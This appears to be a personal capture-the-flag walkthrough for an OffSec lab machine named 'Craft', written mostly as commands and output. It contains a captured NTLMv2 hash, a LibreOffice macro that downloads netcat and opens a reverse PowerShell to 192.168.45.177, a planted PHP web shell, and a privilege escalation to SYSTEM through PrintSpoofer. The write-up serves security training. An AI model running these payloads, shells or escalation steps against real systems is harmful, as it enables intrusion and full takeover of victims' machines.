

https://www.exploit-db.com/exploits/44564

thecybergeek::CRAFT:c5e1f3bc284c3a67:DD3BC8BBF94A060CD0A30AB968D251AF:010100000000000000ED78C4881DDD0149E60752456936660000000002000800450039005500420001001E00570049004E002D0056003500500059004D0030005700500046004600540004003400570049004E002D0056003500500059004D003000570050004600460054002E0045003900550042002E004C004F00430041004C000300140045003900550042002E004C004F00430041004C000500140045003900550042002E004C004F00430041004C000700080000ED78C4881DDD0106000400020000000800300030000000000000000000000000300000F05FAA1EDCE837E319FDD845A3BC35046287209C41F7111264A18C0B97651D9E0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370037000000000000000000

so I create a odt file in lbreoffice, and associate a macros with it, save it as xx.odt, in the macros


Sub Main
	shell("cmd /c powershell wget http://192.168.45.177/nc64.exe -o C:\Users\Public\nc64.exe;C:\Users\Public\nc64.exe 192.168.45.177 8821 -e powershell ")
End Sub

get a shell of a user.

C:\ (Type: Fixed)(Filesystem: NTFS)(Available space: 9 GB)(Permissions: Users [Allow: AppendData/CreateDirectories])

 C:\java\jre(Users [Allow: AppendData/CreateDirectories WriteData/CreateFiles])


PS C:\xampp> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288   

PS C:\xampp> cd htdocs
cd htdocs

PS C:\xampp\htdocs> ls
ls


    Directory: C:\xampp\htdocs


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/13/2021   3:18 AM                assets                                                                
d-----        7/13/2021   3:18 AM                css                                                                   
d-----        7/13/2021   3:18 AM                js                                                                    
d-----        7/27/2026   4:52 AM                uploads                                                               
-a----         7/7/2021  10:53 AM           9635 index.php                                                             
-a----         7/7/2021   9:56 AM            835 upload.php                                                            

PS C:\xampp\htdocs> wget http://192.168.45.177/cmd.php -o cmd.php
wget http://192.168.45.177/cmd.php -o cmd.php

http://craft.offsec/cmd.php?cmd=whoami
craft\apache

http://craft.offsec/cmd.php?cmd=C:\Users\Public\nc64.exe%20192.168.45.177%208822%20-e%20powershell


PS C:\xampp\htdocs> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeTcbPrivilege                Act as part of the operating system       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled


https://github.com/itm4n/printspoofer

PS C:\xampp\htdocs> wget http://192.168.45.177/PrintSpoofer64.exe -o C:\Users\Public\p.exe
wget http://192.168.45.177/PrintSpoofer64.exe -o C:\Users\Public\p.exe

PS C:\Users\Public> .\p.exe -i -c cmd
.\p.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.2029]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

also potato s  works
wget http://192.168.45.177/GodPotato-NET4.exe -o gp.exe
